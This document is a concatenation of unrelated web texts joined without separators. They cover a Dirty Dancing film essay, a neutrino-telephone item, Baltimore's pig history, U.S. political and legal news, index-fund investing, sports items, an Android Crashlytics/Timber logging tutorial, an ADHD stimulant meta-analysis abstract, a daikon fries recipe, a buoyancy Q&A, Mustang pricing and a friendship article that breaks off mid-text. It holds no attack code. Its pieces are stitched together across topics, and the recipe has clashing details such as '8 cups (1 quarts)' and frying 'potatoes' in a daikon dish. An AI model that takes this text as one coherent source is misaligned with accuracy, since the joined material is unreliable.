“Dirty Dancing” may be set in 1963, but it's a rom-com dressed up as a period dance flick that smartly deals with class, feminism and the loss of innocence — both Baby's and America's — just before the assassination of John F. Kennedy.
Though sometimes mushy and a bit campy, “Dirty Dancing” is heartfelt and electric as Baby pursues love with Johnny. She also stands up to her father and does something heroic for the sisterhood: in the pre-Roe v. Wade era, she helps a female friend get money for an abortion, then medical help when the back-alley procedure goes wrong.
You can't write about '80s teen movies featuring female protagonists without addressing the issue of John Hughes, who built three of his movies as director or writer around the singular screen presence of Molly Ringwald. It's Smokler's view that Hughes deserves massive credit for creating the template for teen movies that we still see today, and I agree.
“Sixteen Candles,” “The Breakfast Club” and “Pretty in Pink” certainly were part of my 1980s movie-going diet, and I enjoyed them at the time. But 30 years later, they don't have the same charm for me as “Dirty Dancing” and the others still do. One reason, as Smokler explains, is that they are rife with the casual racism and sexism that still passed as acceptable in the '80s. In addition to the slapstick Asian character in “Sixteen Candles,” other cringe-worthy moments come from rape jokes tossed off by male protagonists in “Sixteen Candles” and “The Breakfast Club.”
Another reason these movies never entirely resonated for me is that Hughes has Ringwald play out situations that feel like they were created by a male auteur with a sentimental but limited vision of real girls' inner lives. Most problematic are his fairy-tale endings that reduce Ringwald's otherwise intelligent, sensitive characters to Disney princesses. Her sole purpose becomes wanting to become the girlfriend of a guy whose only remarkable qualities are that he's good-looking and rich.
The ‘Backlash' decade
Then again, Hughes' handling of sexual politics reflects some of the contradictory attitudes women faced in the 1980s. Writer Susan Faludi famously identified the 1980s “backlash” against feminism, which included a new obsession with sexual danger, either from the scourge of AIDS or from career-women sociopaths like Glenn Close in “Fatal Attraction.”
“Dirty Dancing” and my other favorite films didn't give into the backlash, maybe because, with the exception of “Heathers,” they were the vision of female directors like Heckerling and Martha Coolidge, who helmed “Valley Girl,” or writer Eleanor Bergstein who based “Dirty Dancing” on her own teenage experiences.
While these movies didn't trumpet a feminist agenda, they wove pro-girl and pro-women viewpoints into their narratives and gave us determined, principled heroines who weren't content with being “put in a corner.”
Consider Baby again: She's sometimes gawky and unsure, but she also knows what she wants and makes no apologies for being smart and ambitious. What's most radical is that she's a 17-year-old girl who wants sex. When it comes to her big love scene with Johnny, Baby is the one who does the seducing. Most films, even today, don't have a problem showing teen boys scheming all sorts of ways to have sex, but they are queasy about giving young females the same desire and agency.
But Baby wants it. And guess what? Nothing bad happens to her when she gets it. And after winning the heart and respect of a guy who treats her like an equal, we're left to imagine that she carries on with her plans to go to college and change the world. I can't think of a better message for a girl who's struggling with the big challenge of growing up and becoming her own person.
PARTICLE physics is all very well for addressing trivial matters like “why are we here?” (see article). But some people question its practical usefulness. To answer such naysayers a group of physicists at Fermilab have just submitted a paper to Modern Physics Letters A in which they describe how they have built themselves a neutrino-powered telephone.
Naturally, their neutrinophone is digital. A pulse of neutrinos (small, elusive subatomic particles with no electric charge) corresponds to the digit “1” while no pulse corresponds to “0”. The neutrinos themselves are created by smashing bunches of protons into a target made of graphite. They are detected roughly 1km away by researchers who, in their day jobs, work on a neutrino collaboration called MINERvA. By modulating the pulses of protons the group was able to send a message in binary that, when translated, read “neutrino”. Whether this will go down in history alongside Alexander Graham Bell's first message, “Mr Watson, come here, I want to see you,” remains to be seen.
The point, though, apart from sheer wackiness, is that neutrinos are not easily intercepted by collisions with other sorts of matter. If humanity wanted to broadcast its existence to intelligent life forms that might be out in the galaxy listening, a modulated beam of neutrinos would be a good way of doing so. Conversely, some people argue that listening for ET at radio frequencies is the wrong approach. The right one, they think, would be to build a neutrino-receiver. And that would mean plenty of work for neutrino physicists. Perhaps, then, from its makers' point of view, the neutrinophone is not such a nutty idea, after all.
In the beginning, back when Baltimore was a town of just 60 acres, there were pigs. There were people, of course — 43 of them by 1729 — but apparently a lot of pigs, too: free-roaming swine that some 18th-century Baltimoreans liked and others despised.
Some of the town's first inhabitants considered pigs to be public servants. Others saw them as a public nuisance.
The pig schism transcended generations. Pigs were at the center of a long public debate — by long, I mean like a century — and they were the reason our municipal forebears undertook what might have been Baltimore's first attempt at an infrastructure project.
And had their first big fail.
Thanks to the assiduous work of Matt Crenson, professor emeritus of political science at Johns Hopkins University and one of our wisest owls, we have an understanding of the role pigs played in Baltimore's early development.
Crenson has been laboring for years on a political history of the city, and it will finally be published, at more than 500 pages, next month by the Johns Hopkins University Press. "Baltimore: A Political History" is a delightful read, richly informative and amusing in parts, and no part more amusing than Crenson's survey of the swine issue.
In the early- to mid-18th century, when Maryland was still a colony, Baltimore was a small town with no clout. All political power was in Annapolis with the colonial assembly. In 1729, the assembly established Baltimore Town and appointed seven commissioners to oversee the sale of lots. Eighteen years later, the assembly allowed the commissioners to develop new streets, hold a couple of fairs and deal with "nuisances."
That's when the commissioners first decided to take up the "nuisance" of roaming pigs. Their idea was to build a fence — a big, beautiful fence (sorry, couldn't resist) — around Baltimore Town to keep pigs off the town's muddy, unpaved streets. They planned to finance the project with "debts and arrearages" due to the town.
They hired William Fell to do the job, but almost immediately encountered what might have been Baltimore's first construction delay: Fell died before he could set a single fence post.
Determined to get the barrier built, the commissioners hired two other contractors to complete the job in 1750. But Crenson reports the project failed due to lack of public support. Winter came, and Baltimoreans stole posts from the unfinished fence for firewood. A minister and a doctor were among the suspects.
"Baltimore would attempt repeatedly to regulate the wanderings of wayward swine," Crenson writes, "but for a century after the failure of the fence, porcine pedestrians would continue to walk the streets along with Baltimore's human beings."
Baltimore grew slowly — in large measure, says Crenson, because it lacked autonomy from Annapolis. The streets remained unpaved, and by the end of 1776, when the Continental Congress moved from Philadelphia to Baltimore, John Adams declared it "the dirtiest place in the World."

Adams understood that Baltimore had no political power, no authority to raise funds for public projects, such as street paving. Annapolis passed laws making it illegal for pigs and geese to roam Baltimore's swampy streets, but nothing changed for years.
And so the pigs remained, and it seems from Crenson's history that many Baltimoreans, especially the poorest ones, came to appreciate them. Pigs ate the garbage that humans created in spring and summer. Once butchered, pigs provided food for a family in fall and winter.
Baltimore's incorporation as a city came in 1797. That's when the population of 20,000 got its first mayor (James Calhoun) and City Council. Over the next 50 years, writes Crenson, Baltimore achieved functional autonomy and enjoyed greater representation in the General Assembly. The city continued to grow.
But well into the 19th century, an old concern remained.
"The town's enduring preoccupation with 'swine going at large' continued," Crenson writes. The City Council tried to prohibit pigs from wandering the streets, but opponents argued that pigs made a contribution to public sanitation: Pigs ate garbage. If the pigs didn't eat garbage, what was the city going to do about the garbage?
The Baltimore Sun treated that argument with contempt: Encouraging pigs to eat garbage just encouraged Baltimoreans to leave garbage in the streets. When the council voted to make it illegal to bring hogs into the city except for sale or slaughter, there was more backlash. The new ordinance, opponents said, would deprive Baltimore's poor of the relatively inexpensive meat they needed for their families.
Crenson tracks argument and impasse, action and stalemate over more than a century. Wandering swine were not among the big problems that hindered Baltimore in its early development. But this bit of history reflects the stubborn parochialism and official dithering that might have gotten into the city's DNA. Crenson's rendering of the pig issue is not meant to be quaint. It's there because it's telling — about yesterday, and today.

(CNN) - Pressed about his aggressive campaign against Newt Gingrich, Texas Rep. Ron Paul said he feels responsible to show a different side of the former House speaker to the American public.
"I have to expose him for what he's been doing over the years. That's all we're doing. Trying to present the facts," Paul said to reporters at a town hall event in Des Moines, Iowa.
In the last week, Paul has been a vocal critic of Gingrich, a man he calls a "counterfeit conservative." The Texas congressman has frequently hit the GOP front-runner as a flip-flopper and Washington insider, and in an interview with CNN on Friday, he described Gingrich's new popularity as "bewildering."
Paul's campaign also released a round of negative TV ads against Gingrich in Iowa on Wednesday, which is now set to expand into New Hampshire, the first-in-the-nation primary state.
Paul's attacks follow a surge for Gingrich in the GOP presidential horserace, where he now tops the field in three out of four early voting states, according to a new CNN/ORC International Poll.
On the heels of a Congressional showdown over ways to pay for a payroll tax cut extension, Paul also weighed in Thursday on what he calls the worst debt situation "in the history of the world."
Paul, a former obstetrician, compared Washington spending to a drug addict who fails to recover because he keeps getting fix after fix.
"But, you know, if you don't get off the drugs, if you're an alcoholic, and you're about to ruin your liver, I tell you what, if you don't quit, the patient dies," he said.

CLOSE California prosecutors on Tuesday charged two anti-abortion activists who made undercover videos of themselves trying to buy fetal tissue from Planned Parenthood with 15 felonies, saying they invaded the privacy of medical providers by filming without consent. USA TODAY

Two anti-abortion activists who filmed controversial undercover videos as they attempted to buy fetal tissue from Planned Parenthood have been charged in California with 15 felonies for allegedly invading the privacy of medical providers by filming without consent.
State prosecutors filed the charges Tuesday against David Daleiden and Sandra Merritt of the Center for Medical Progress, eight months after similar charges were dropped in Texas.
Meanwhile, the 9th Circuit Court of Appeals on Wednesday upheld an injunction barring anti-abortion activists from distributing the controversial recordings.
California Attorney General Xavier Becerra, a former Democratic member of Congress, said in a statement that the state “will not tolerate the criminal recording of conversations.”
Prosecutors say Daleiden, of Davis, Calif., and Merritt, of San Jose, filmed 14 people without permission from October 2013 to July 2015 in Los Angeles, San Francisco and El Dorado counties. One felony count was filed for each person. They were also accused of one count of criminal conspiracy to invade privacy.
Daleiden said in an email to The Associated Press that the “bogus” charges are coming from “Planned Parenthood's political cronies.”
“The public knows the real criminals are Planned Parenthood and their business partners,” Daleiden said.
The conversations included officials from Planned Parenthood and StemExpress, a California company that provides blood, tissue and other biological material for medical research and received fetal tissue from Planned Parenthood.
The videos, released in 2015, reignited the ongoing abortion debate in the U.S. and renewed efforts in Congress to attempt to defund Planned Parenthood.
Planned Parenthood receives about $500 million a year from the federal government to provide cancer screenings, medical checkups and birth control services but is barred by federal law from using taxpayer money to pay for abortions.
An affidavit filed in San Francisco Superior Court alleges Daleiden and Merritt used bogus driver's licenses and created a sham medical research company, BioMax Procurement Services, to attend the National Abortion Federation's 2014 conference in San Francisco, the Los Angeles Times reports.
At the conference, according to court documents, the pair posed as BioMax representatives, used phony names and surreptitiously recorded eight attendees and speakers.
In the months after the conference, they are accused of using the same phony biomedical company to set up dinner meetings with women's health care providers who were also recorded surreptitiously, according to prosecutors.
In one of the meetings, Daleiden posed as “Robert Sarkis” of the phony Biomax company and is shown discussing liver tissue with the chief executive of StemExpress at a Northern California restaurant.
Abortion opponents claimed the recordings showed Planned Parenthood was illegally harvesting and selling the organs. Planned Parenthood said the videos were deceptively edited to support false claims from the anti-abortion forces.
“As we have said from the beginning, and as more than a dozen different state investigations have made clear: Planned Parenthood has done nothing wrong, and the only people who broke the law are those behind the fraudulent tapes,” Mary Alice Carter, interim vice president of communications for Planned Parenthood, said in a statement.
"Their efforts were furtherance of First Amendment values and are clothed with the same Constitutional protection that all investigative journalists deserve and must enjoy," Brejcha said in a statement."Undercover journalism has been a vital tool in our politics and self-governance.“
Last year, Daleiden said in a Facebook post that the California Department of Justice agents raided his home, seizing all of his video footage along with personal information. Until Tuesday, however, there were no indications that the state planned to file any charges.
The similar case in Texas came amid a legal roller coaster ride. A grand jury originally convened to investigate Planned Parenthood found no wrongdoing by the group and instead indicted Daleiden and Merritt. Those charges, however, were eventually dropped after Texas prosecutors said the grand jury overstepped its authority.
In the federal appeals court ruling upholding the injunction against distributing the material, two of the three judges said, "One may not obtain information through fraud, promise to keep that information confidential, and then breach that promise in the name of the public interest."

Some people believe in the Loch Ness monster and Bigfoot, while others cling to the notion that they can beat the market if they find just the right system for buying stocks and bonds.
I'm not going to refute the existence of cryptids like Nessie or a giant walking carpet, but I would like to suggest that, over a lifetime, most do-it-yourself stock pickers will underperform their benchmark indexes.
My rationale? If most professional investors can't beat a portfolio of indexes, then it's safe to say that the average market moonlighter will also fall short.
Story continues below advertisement
Consider Canada's actively managed mutual fund industry. It's composed of trained, professional investors who spend every working hour researching and trading stocks and bonds.
Yes, the average fund charges embarrassingly high expense ratios. But even if professionally managed funds charged nothing at all, would most of them beat their benchmark indexes over a decade or more? I decided to find out.
I examined the performance of the myriad of Canadian balanced equity funds tracked at globefund.com. If professional investors could pick winning stocks and knew when to jump into stocks and when to take refuge in bonds, these actively managed balanced funds would have been beacons in a murky decade for investors.
Here's the reality: The average annual return of Canadian equity balanced funds from Aug. 31, 2002 to Aug. 31, 2012 was 4.7 per cent.
These funds hold both stocks and bonds, so I compared their results with a simple two-fund portfolio made up of the TD e-Series Canadian equity index fund (60 per cent) and the TD e-Series Canadian bond fund (40 per cent). If you bought these two index funds in August 2002, without making a single adjustment, you would have turned a $10,000 investment into $20,419.39.
Instead, if the same $10,000 were invested in a representative collection of Canadian equity balanced funds, it would have grown to just $15,829.48.
This, of course, just proves that most active managers can't overcome the costs of their management fees. But let's take a closer look and assume that the average management expense ratio (MER) for the actively managed funds was 0 per cent instead of 2.64 per cent.
Story continues below advertisement
Story continues below advertisement
Add this 2.64 per cent management fee to the 4.7 per cent performance earned by the Canadian balanced funds over the past decade, and the average annual returns (if the MER didn't exist) would have been 7.34 per cent.
It looks better now, doesn't it? But 7.34 per cent is still slightly behind the 7.4 per cent you would have earned by putting 60 per cent of your money in TD's Canadian e-Series stock index with 40 per cent in the bank's e-Series bond index.
Canada's active fund managers aren't foolish rookies. If there were exploitable advantages to buying dividend stocks, growth stocks or value stocks, most of these professionals would be all over the winning strategies. Yet they still, as a group, underperformed the index investor who chose similar allocations of stocks and bonds.
What's more, TD e-Series index funds aren't particularly cheap. Their management fees amount to roughly 0.4 per cent per year. You could do even better with a collection of low cost exchange traded funds, much like those in my Strategy Lab indexed portfolio. Shaving a further 0.2 per cent in fees would add profits to your bottom line.
I can't say that the Loch Ness Monster and Bigfoot don't exist. Nor can I say that you won't be able to dance in and out of stocks and bonds and manage to beat a portfolio of indexes over your lifetime. But one thing appears clear. To do so, you'll need to exert more skill than the average professional investor – even if that professional were working for free.
Your investment portfolio isn't a Strategy Lab contest. It's real money that you'll be investing over your lifetime. Are you sure you want to risk it?
CBS Sports
Cincinnati Bengals cornerback Adam "Pacman" Jones has been fined $35,000 by the NFL for slamming Oakland Raiders wide receiver Amari Cooper's head onto his helmet during the teams' Week 1 matchup. Geoff Hobson of Bengals.com first reported the news.
The play came during the second quarter, as Cooper was blocking Jones during a long run play for the Raiders.
First, Cooper appears to take a swing at Jones before the play ends:
Jones then wrestles Cooper to the ground, pulls his helmet off, and slams the standout rookie's head onto it. Flags were thrown, but Jones wasn't ejected, and the penalty was offset by another penalty on the same play.
Jones took to SportsCenter today to announce that he will appeal the fine. He said $35,000 was too much money for a football play. He also said he couldn't promise similar incidents wouldn't happen in the future.
ESPN
The decision to fine Jones, and Jones' on-the-record unwillingness to change his behavior going forward, are particularly interesting when you put them in the context of Roger Goodell's recent comments regarding the importance of suspensions in the NFL. After Judge Berman overturned Tom Brady's suspension, Goodell went on Mike & Mike to explain why suspensions are more important than fines, saying "fines don't work."
Goodell added:
That's why we want to make sure that in our decisions there are competitive consequences. Fines don't work. Suspensions are important in those circumstances. Just as when we have competitive violations with teams, we just don't fine, we actually normally focus in on draft choices or some other type of competitive discipline so that you can avoid this behavior going forward, you can prevent this behavior going forward.
The decision to fine — and not suspend — Jones for this incident seems then to directly contradict Goodell's fundamental belief that fines don't work.
Of course, it's far too early in the season to know whether this punishment for Jones is indicative of a larger shift in Goodell's and the NFL's discipline process, but at the very least it is certainly something to keep an eye on as the season progresses.
It's been a very exciting month at Mach 30. We have made amazing progress on the Shepard Test Stand, gotten accepted to speak at a conference, and exhibited at another. If life were a video game, Mach 30's volunteers and partners would have just earned a whole slew of achievements. Check them out.
Replication – Have your OSHW project built by a third party
This month, the Coca-Cola Space Science Center (CCSSC) became the first group outside Mach 30 to build a Shepard Test Stand. I am particularly pleased with this achievement since it is such a concrete demonstration of our open source principles at work. Here's CCSSC sharing it with us over a Google+ Hangout.
I'm not the only one who is happy about this news. Here's what Matt Bartow, the educational services support specialist at CCSSC, had to say.
“Congratulations to all of you at Mach 30, because I know you were very excited about seeing the first one externally built. It was a great success, and thank you for all your help through our build process. We will start posting our data, and, as we begin using it for student educational programming, we will also be posting about that as well.
If you need anything at all, please let us know. Thank you so much for letting us be a part of the Shepard Program, and we are very eager to watch as everything develops for the betterment of STEM education.”
Smoke and Fire – Complete first test firing of a rocket test stand
This achievement actually goes to our friends at CCSSC. Not only did they build their own copy of the Shepard Test Stand, but a few days later they successfully fired it. Plus they were able to collect data from their tests and as you can see below, it looks very good (the flat spot in the graph is from a known bug in the Data Acquisition (DAQ) software which should be fixed shortly). Congrats to CCSSC and the Shepard project team!
Spread the Word – Get accepted as a presenter at a conference
I am also happy to announce that Mach 30's Export Control Task Force has had its presentation on Open Source Hardware and Export Controls accepted as a topic at the 2013 Open Hardware Summit in Boston. The format for the presentation is a 6+1 (6 minute presentation followed by 1 minute for questions). The task force is currently working on the presentation materials, which of course will be openly licensed. Stay tuned for more details.
Show and Tell – Attend a major conference as an exhibitor
To top off the month, I was able to attend New Space 2013 where I ran Mach 30's booth. This is the first time Mach 30 has exhibited at a major space conference, though not our first exhibit experience (we have taken the Shepard Test Stand to both the Open Hardware Summit and a regional Maker Faire). Thanks to the hard work of our volunteers, Mach 30's booth included display materials and two hardware projects: Shepard and the first ground station prototype. Sadly, due to fire restrictions I was not able to run a test fire on Shepard at the conference. But New Space and Mach 30 are already talking about what needs to be done to conduct test fires next year.
Look for a complete report on the conference later this week.

It's an annoying problem to have crashes in your Android app. Obviously you want to avoid them, nobody wants their users getting mad at the app when it crashes. On top of that, you might also want to have some information on why the app crashes. Here is where the Android logging system is available to help you with this. So far, so good. However, there are some caveats.
A typical log goes like this:
Log . e ( TAG , "A message about something weird" );
For more information you could catch an exception and print its stack trace:
exception . printStackTrace ();
During app development you can notice this easily. But what happens if this occurs in the user's device? You won't realize. And yet worse, it will get logged in the users' devices consuming memory space for a non-existent reader.
Apart from this, what is that TAG ? You know, it's something that gives you context about the message and it's a common practice to name it after the class you are working on:
private static final String TAG = "SomeClass" ;
After all, why do we have to do this? This is boilerplate. You have to add it to each class that you log messages and receive warnings about some of them being unused if any log is removed.
Crashlytics
Crashlytics, part of Fabric, is there for you. Crashes and logged exceptions will be notified to you via email if you decide to use it. More information about the issues is available, like the whole stack trace, Android versions that caused the issue, device models and even more details you want to add.
To setup Crashlytics in your app you have to add this to your build.gradle :
buildscript { repositories { maven { url 'https://maven.fabric.io/public' } } dependencies { classpath 'io.fabric.tools:gradle:1.+' } } apply plugin: 'io.fabric' repositories { maven { url 'https://maven.fabric.io/public' } } // ... dependencies { compile('com.crashlytics.sdk.android:crashlytics:[email protected]') { transitive = true; } }
This in your Application creation:
Fabric . with ( this , new Crashlytics ());
And if you want it to be disabled in debug mode (and I'm sure you want) use this instead:
CrashlyticsCore core = new CrashlyticsCore . Builder () . disabled ( BuildConfig . DEBUG ) . build (); Fabric . with ( this , new Crashlytics . Builder (). core ( core ). build ());
(thanks @gonzalomelov for a fix regarding this)
Also be sure that your Android app has internet access permission granted.
By the way, Crashlytics also provides Answers: a service that logs app usage in a daily basis such as daily active users, monthly active users, count of new users, average session duration, among other things.
Crashes are automatically reported. On the other hand, to log caught exceptions you just simple write:
Crashlytics . logException ( exception );
Key-value pairs can be added to the issues before you log them by using:
Crashlytics . setString ( "key" , "value" );
Other data types are accepted too.
So, every time I want to log something, do I have to use the Android Log and Crashlytics? What happens if I want to have more control over what I log in each place? This is when Timber comes into play.
Timber
Timber is a lightweight library to write logs in different places and control how it's done in a centralized manner. It's easy to add it as a dependency of your Android Studio project:
compile 'com.jakewharton.timber:timber:3.1.0'
To use Android log only in debug mode you could use something like this code in your Application creation:
@Override public void onCreate () { super . onCreate (); // ... CrashlyticsCore core = new CrashlyticsCore . Builder () . disabled ( BuildConfig . DEBUG ) . build (); Fabric . with ( this , new Crashlytics . Builder (). core ( core ). build ()); // ... if ( BuildConfig . DEBUG ) { Timber . plant ( new Timber . DebugTree ()); } Timber . plant ( new CrashlyticsTree ()); } public class CrashlyticsTree extends Timber . Tree { private static final String CRASHLYTICS_KEY_PRIORITY = "priority" ; private static final String CRASHLYTICS_KEY_TAG = "tag" ; private static final String CRASHLYTICS_KEY_MESSAGE = "message" ; @Override protected void log ( int priority , @Nullable String tag , @Nullable String message , @Nullable Throwable t ) { if ( priority == Log . VERBOSE || priority == Log . DEBUG || priority == Log . INFO ) { return ; } Crashlytics . setInt ( CRASHLYTICS_KEY_PRIORITY , priority ); Crashlytics . setString ( CRASHLYTICS_KEY_TAG , tag ); Crashlytics . setString ( CRASHLYTICS_KEY_MESSAGE , message ); if ( t == null ) { Crashlytics . logException ( new Exception ( message )); } else { Crashlytics . logException ( t ); } } }
This way we could log only those messages above certain severity. Also some context is added to Crashlytics issues. Remember that Crashlytics is already only in non-debug mode.
To log you just simply:
Timber . e ( exception , "Message" );
Or a null message if you want:
Timber . w ( exception , null );
A simple message can be logged, and it'll be sent via Crashlytics too:
Timber . e ( "A cool message" );
See? There is no TAG parameter. It's automagically assigned as the caller class' name by Timber.
This way, the next time a user complains about a crash, you won't have to start blindly on finding the fix for it. With Timber and Crashlytics you will be notified when an issue occurs. You will also have the tag which gives context, its stack trace and any additional information you may want, both in development and also in production! All with a simple log!
So, using Timber and Crashlytics will simply make your life easier when looking for those ugly crashes that keeps you awake at night, and your users happy too!
The Tourism Authority of Thailand (TAT) yesterday named 24 provinces for hunting rare Pokémon characters in what it said is its effort to boost tourism to these places.
TAT's director for information technology Mr Siripakorn Chiewsamut said the Pokémon hunting is part of the TAT's “12 Must See” and “12 Must See Plus” project to attract tourists to visit secondary tourism locations in rural areas which have many things not to be missed.
He said TAT wished to stimulate tourism to these provinces during weekdays which saw less than 5 million visits per year.
He said TAT has officially sent a letter to the developer company seeking its release of rare Pokémon characters in these 24 provinces, and is awaiting its reply on it.
He assured that TAT has measures already to prevent impact on rural way of life from Pokémon hunting, and already popular tourist spots.
The 24 provinces are Nan, Phrae, Lampang, Lamphun, Phetchabun, Phitsanulok, Loei, Chaiyaphum, Buriram, Surin, Ratchaburi, Suphan Buri, Samut Songkram, Nakhon Pathom, Trat, Rayong, Chanthaburi, Sra Kaew, Chumphon, Ranong, Trang, Satun, Nakhon Si Thammarat and Phatthalung.
Mariners shortstop Brad Miller had a monster spring training, batting .410 with 14 extra-base hits and a 1.314 OPS in 70 plate appearances to easily hold off Nick Franklin for the starting job. And he kept rolling last night, homering twice in an 8-3 win over the Angels.
Combined with his half-season debut last year Miller now has 10 homers in 78 career regular season games. He also went deep 16 times in 108 total games between Double-A and Triple-A while in the minors.
That's not extraordinary power or anything, but it certainly suggests Miller is capable of hitting 20-plus homers over the course of a full season and … well, not a lot of 24-year-old shortstops do that. In fact, here's the complete list of 24-year-old shortstops with 20 or more homers in the last 20 years: Alex Rodriguez, Nomar Garciaparra, Hanley Ramirez, Troy Tulowitzki, J.J. Hardy, Bobby Crosby.
Miller was never a particularly highly touted prospect coming up through the Mariners' farm system, but he hit .334 with a .925 OPS in the minors and looks ready to form a helluva double-play combo with Robinson Cano.

An open petition asking the Government of Canada to take actions to potentially curb foreign ownership of property has been tabled by a Burnaby resident concerned about runaway real estate prices in Metro Vancouver
NDP MP Kennedy Stewart has sponsored Raymond Wong's petition calling on the federal government to collect reliable data on offshore investment in Canada's real estate market.
article continues below
As part of a five-point demand, Wong is also asking Prime Minister Justin Trudeau to investigate suspicious transactions flagged by the Financial Transactions and Report Analysis Centre of Canada (FINTRAC) that are related to real estate, demand that non-residents register with the government in order to buy a home, and consider restricting such ownership arrangements.
Wong also wants the Canadian government to follow in the footsteps of countries such as Australia, USA, Hong Kong, England, Singapore and New Zealand, which have — to differing levels — placed restrictions on foreign home ownership.
Wong states that as prices continue to soar, families are unable to afford to live in Metro Vancouver, thus many schools in the area are in danger of being shut down.
“Rental units have also become unaffordable for families even with a household median income in Greater Vancouver of $70,000,” noted Wong.
The petition runs until August 6 and can be found online as Petition e-281 at Petitions.parl.gc.ca.
The month-old petition has garnered about 1,500 signatures, well below many other sponsored petitions.
It comes as local academic experts on the subject have gained more attention in the media. This week, a non-peer reviewed study from assistant professor Josh Gordon at Simon Fraser University's School of Public Policy, outlined how the “dominant explanation” for the affordable housing crisis in Metro Vancouver “is a large and continuous flow of foreign money into the region, especially from China, which has reached unprecedented levels in the past year. This factor accounts for most of the crisis, on its own.”
Gordon acknowledged the limitations of concrete home ownership data, although he places blame for this gap on “intentionally inept government oversight.”
Gordon notes the debate about foreign money needn't be one clouded by calls of racism, as has been the case from some members of the real estate industry.
He contends that low interest rates, geographical constraints and a desire to live here are mere “distractions” to the root cause of runaway housing prices: foreign money.
He puts in doubt claims by the provincial government that the B.C. economy is strong. Instead, the economy is highly dependent on industry-related activity and property transfer taxes from a housing market bubble, which comes at the expense of non-homeowners.
OBJECTIVE:
Irritability is listed as a common side effect of psychostimulant medications. However, psychostimulants have been demonstrated as an effective treatment in reducing irritability and aggression in children with attention-deficit/hyperactivity disorder (ADHD). The goal of this study was to quantify the risk of irritability as a side effect of psychostimulant treatment for ADHD.
DATA SOURCES AND STUDY SELECTION:
A PubMed search was conducted on August 18, 2013, to identify all double-blind, randomized, placebo-controlled trials published in English examining the efficacy of psychostimulant medications in the treatment of children with ADHD. Trials were excluded if (1) they required additional psychiatric or medical comorbidity in addition to ADHD, (2) they involved fewer than 20 subjects (parallel group trials), or (3) children received psychostimulant medication for less than 1 week.
DATA EXTRACTION:
A fixed-effects meta-analysis was used to examine the risk ratio of irritability reported as a side effect in children treated with psychostimulants compared to placebo. Stratified subgroup analysis and meta-regression were used to examine the effects of stimulant type, dosage, duration of use, and trial design on the measured risk of irritability.
RESULTS:
From 92 potentially eligible trials, the meta-analysis identified 32 trials involving 3,664 children with ADHD that reported data on irritability as a side effect. The relative risk of irritability significantly differed between psychostimulant classes (test for subgroup differences χ²₁ = 7.6, P = .006). Methylphenidate derivatives were associated with a significantly decreased risk of irritability compared to placebo (risk ratio [RR] = 0.89 [95% CI, 0.82 to 0.96], z = -2.87, P = .004, k = 32, I² = 50%), whereas amphetamine derivatives were associated with a significantly increased risk of irritability (RR = 2.90 [95% CI, 1.26 to 6.71], z = 2.5, P = .01, k = 5, I² = 0%).
CONCLUSIONS:
This meta-analysis suggests an increased risk of irritability may be confined to amphetamine-derived psychostimulants. Future meta-analyses examining the effects of amphetamine and methylphenidate derivatives on irritability as a continuous measure, as well as head-to-head trials between methylphenidate and amphetamine derivatives examining effects on irritability, will be important to replicate the findings of this meta-analysis.

Based on this method: Perfect French Fries
Note: I have included 10 Tablespoons of peanut oil for the entire recipes in calories/fat since that was the amount that seemed to dissipate from the pan.
I prefer the thinner-cut fries for this recipe because they cook and crisp up slightly better than the 1/4″ fries recommended by the link above. These fries get soggy pretty fast after the second cook, so be prepared to serve immediately, or make smaller batches, freezing the rest for later. Be careful; frozen foods can cause hot oil to spatter.
Delicious Daikon French Fries
2 pounds (907 grams) of Daikon radish, skinned and sliced into 1/4″ x 1/4″ strips (1/8″ x 1/8″ is even better for crisping them up)
2 Tbsp vinegar
4 cups (1 quart) peanut oil
Place daikon radish and vinegar in saucepan and add 8 cups (1 quarts) of water and 2 tablespoons of salt. Bring to a boil over high heat. Boil for 10 minutes. Daikon should be fully tender, but not falling apart. Drain and spread on paper towel-lined rimmed baking sheet. Allow to dry for five minutes.
Meanwhile, heat oil in 3-quart saucepan over medium- heat (about 7 on my stove top) to 400°F. Add 1/4 of fries to the oil (oil temperature should drop to around 360°F). Cook for 55 seconds, agitating occasionally with a metal slotted spoon, then remove to second paper-towel lined rimmed baking sheet. Repeat with remaining daikon (working in two more batches), allowing oil to return to 400°F after each addition. Allow daikon to cool to room temperature, about 30 minutes. Continue with step 3, or for best results, freeze daikon at least over night, or up to 2 months.
Bring oil to 400°F over medium-high heat. Fry half of potatoes until crisp and light golden brown, about 3 1/2 minutes, adjusting heat to maintain at around 360°F. Drain in a bowl lined with paper towels and serve immediately with salt.
Makes 2 pounds of fries, or about 6 servings.

Would a person weigh more in a denser atmosphere than in a less dense atmosphere? Does the pressure exerted by a column of air cause changes in a person's weight?
Actually, a person would weigh less in a denser atmosphere. "Weight" is how much you push down on a scale - which is different from "mass" which is how much matter you contain (which wouldn't change). The formula is: weight= mass*(gravitational acceleration). The pressure exerted by a column of air is the same in all directions, so a heavy atmosphere does not have weight since it pushes just as much up as it does down. What makes your weight be less in a heavy atmosphere is the buoyancy effect - your volume is taking up space that would normally be taken by the heavy air, and the mass of the displaced air is subtracted from your mass when calculating weight: your weight=(your mass-displaced air mass)*(acceleration of gravity). Note that if the mass of displaced air is equal to your mass, you will weigh nothing (neutral buoyancy), and if you weigh less than the displaced air (as you do in water) you will float.

It does not mean they've ordered, but the number shows that Europe has really waited for it. There is no V6 option for the EU market so the configurations split almost 50:50 between 2.3 and 5.0 models.
According to Ford the most popular overall configuration (37%) was the 2.3 EcoBoost with 6-speed manual. Race Red and Black were chosen both for 20% of the configurations. Deep Impact Blue was popular choice in UK and Italy.
61% chose the black leather interior, 28% of which also chose the Custom Pack – Shaker Pro premium audio with navi, climate controlled seats, reverse parking sensors, 19-inch wheels and side window chrome wrap.
2015 Mustang starts at in Germany:
2.3 EcoBoost – 35.000 Eur / $36.737
5.0 V8 – 40.000 Eur / $41.986
2015 Mustang starts at in UK:
2.3 EcoBoost – 28.995 GBP / $42.751
5.0 V8 – 32.995 GBP / $48.649
Compare that to your American MSRP $23.800 for the EcoBoost and $29.300 for the V8. Be happy, Americans. You get is helluva cheap and don't get these ugly pale tail lights.
How To Turn A Stranger Into A Friend
Post written by Paul Sanders.
If you don't know how friendship starts, and how two strangers become friends, it can be hard to build a good social life.
In this article, I would like to share with you the specific steps that you can take to turn a stranger into a friend.
The Right Environment
You almost never make friends on the bus, or at a bank. The context is not appropriate, and that's part of how friendship starts; you need an appropriate context.
It's much easier to make friends in yoga class, or a business community for example. These are environments where people go to meet others.
The common mistake people make is to think that you could make friends in “public” places like bars or coffee shops. That's the hard way to make friends. Instead, it's much better to focus on semi-private communities and clubs where people expect to meet new friends.
The Right Situation
